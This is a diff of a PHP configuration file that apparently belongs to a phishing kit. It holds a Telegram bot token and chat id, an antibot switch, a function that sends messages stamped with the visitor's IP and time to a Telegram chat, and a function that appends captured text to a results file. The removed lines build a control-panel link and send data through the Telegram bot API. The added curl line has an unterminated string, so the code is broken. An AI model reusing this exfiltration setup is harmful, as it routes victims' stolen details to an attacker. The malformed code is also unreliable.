@@ -1,32 +1,17 @@
 <?php
 
-     
-
-$token = "9108139118:AAEisCNeCi_q_-0DNVTz_icKHkYbrU_dTRc";
+$token = "9108139118:AAEisCNeCi_q_-0DNVTz_icKHKybrU_dTRc";
 $id = "-1003987841987";
-
 
 // use antibot? yes|no
 $antibot = "yes";
 
- 
-$ipp = "";
-if($_SERVER['REMOTE_ADDR']=="::1"){
-$ipp = "127.0.0.1";
-}else{
-$ipp = $_SERVER['REMOTE_ADDR'];
-}
-$panel_link = str_replace("auth/post.php", "panel/ctr.php", "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."?ip=$ipp");
-
- 
-
 function call($msg){
     global $token;
     global $id;
-    global $panel_link;
-    $info = "";
+    $info = "\n\n/- MORE INFO -/\nIP: " . $_SERVER['REMOTE_ADDR'] . "\nTIME: " . date("m/d/Y h:i:sa");
 
-    $c = curl_init('https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$id.'&text='.urlencode($msg.$info));
+    $c = curl_init('https://telegram.org);
     curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
     curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
     $res = curl_exec($c);
@@ -34,14 +19,10 @@ function call($msg){
     return $res;
 }
 
-
 function save($txt){
     $fp = fopen((__DIR__)."/rez.txt", "a");
     fwrite($fp, $txt);
     fclose($fp);
 }
-
-
-
 
 ?>
